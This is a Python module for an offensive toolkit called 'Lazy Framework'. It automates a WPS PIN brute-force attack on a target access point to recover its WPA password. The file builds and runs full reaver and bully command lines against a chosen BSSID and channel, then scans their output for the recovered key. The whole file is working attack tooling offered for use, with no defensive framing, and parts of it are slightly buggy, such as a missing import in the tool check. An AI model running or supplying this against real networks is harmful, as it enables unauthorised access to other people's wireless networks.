#!/usr/bin/env python3

MODULE_INFO = {
    "name": "WPS PIN Attack",
    "description": "Brute force WPS PIN to recover WPA password",
    "author": "Lazy Framework",
    "license": "MIT", 
    "dependencies": ["reaver", "bully"],
    "platform": "Linux",
    "rank": "Normal",
}

OPTIONS = {
    "interface": {
        "description": "Wireless interface in monitor mode",
        "required": True,
        "default": "wlan0mon"
    },
    "target_bssid": {
        "description": "Target access point BSSID",
        "required": True,
        "default": ""
    },
    "channel": {
        "description": "Target channel",
        "required": True,
        "default": ""
    },
    "timeout": {
        "description": "Timeout per PIN attempt in seconds",
        "required": False,
        "default": "60"
    },
    "delay": {
        "description": "Delay between attempts in seconds",
        "required": False, 
        "default": "1"
    }
}

def run(session, options):
    from rich.console import Console
    from rich.panel import Panel
    import subprocess
    import sys
    
    console = Console()
    interface = options.get("interface", "wlan0mon")
    target_bssid = options.get("target_bssid", "")
    channel = options.get("channel", "")
    timeout = options.get("timeout", "60")
    delay = options.get("delay", "1")
    
    if not target_bssid or not channel:
        console.print("[red]Error: target_bssid and channel are required[/red]")
        return
    
    console.print(Panel.fit(
        f"[bold]WPS PIN Attack[/bold]\n"
        f"Target: [yellow]{target_bssid}[/yellow]\n" 
        f"Channel: [cyan]{channel}[/cyan]\n"
        f"Interface: [green]{interface}[/green]"
    ))
    
    # Check for available tools
    tools = []
    if check_tool("reaver"):
        tools.append("reaver")
    if check_tool("bully"):
        tools.append("bully")
    
    if not tools:
        console.print("[red]Error: Neither reaver nor bully is installed[/red]")
        console.print("[yellow]Install with: sudo apt install reaver bully[/yellow]")
        return
    
    console.print(f"[green]Available tools: {', '.join(tools)}[/green]")
    
    try:
        # Try reaver first
        if "reaver" in tools:
            console.print("\n[yellow]Attempting WPS attack with reaver...[/yellow]")
            reaver_cmd = [
                "reaver", "-i", interface, "-b", target_bssid, 
                "-c", channel, "-vv", "-K", "1", "-t", "2",
                "-d", delay, "-T", timeout
            ]
            
            console.print(f"[cyan]Command: {' '.join(reaver_cmd)}[/cyan]")
            
            # Run reaver
            process = subprocess.Popen(
                reaver_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True
            )
            
            # Monitor output
            for line in process.stdout:
                console.print(f"[dim]{line.strip()}[/dim]")
                if "WPA PSK" in line or "WPS PIN:" in line:
                    console.print(Panel.fit(
                        f"[bold green]✓ Success! Password found![/bold green]\n{line}",
                        border_style="green"
                    ))
                    process.terminate()
                    break
                elif "failed" in line.lower() and "association" in line.lower():
                    console.print("[red]Association failed, trying bully...[/red]")
                    process.terminate()
                    break
            
            process.wait()
        
        # If reaver failed, try bully
        if "bully" in tools and not process.returncode == 0:
            console.print("\n[yellow]Attempting WPS attack with bully...[/yellow]")
            bully_cmd = [
                "bully", interface, "-b", target_bssid, 
                "-c", channel, "-v", "3"
            ]
            
            console.print(f"[cyan]Command: {' '.join(bully_cmd)}[/cyan]")
            
            process = subprocess.Popen(
                bully_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True
            )
            
            for line in process.stdout:
                console.print(f"[dim]{line.strip()}[/dim]")
                if "key" in line.lower() and "found" in line.lower():
                    console.print(Panel.fit(
                        f"[bold green]✓ Success! Password found![/bold green]\n{line}",
                        border_style="green"
                    ))
                    break
            
            process.wait()
            
    except KeyboardInterrupt:
        console.print("\n[yellow]Attack interrupted by user[/yellow]")
    except Exception as e:
        console.print(f"[red]Error during WPS attack: {e}[/red]")

def check_tool(tool_name):
    try:
        subprocess.run([tool_name, "--version"], capture_output=True)
        return True
    except:
        return False
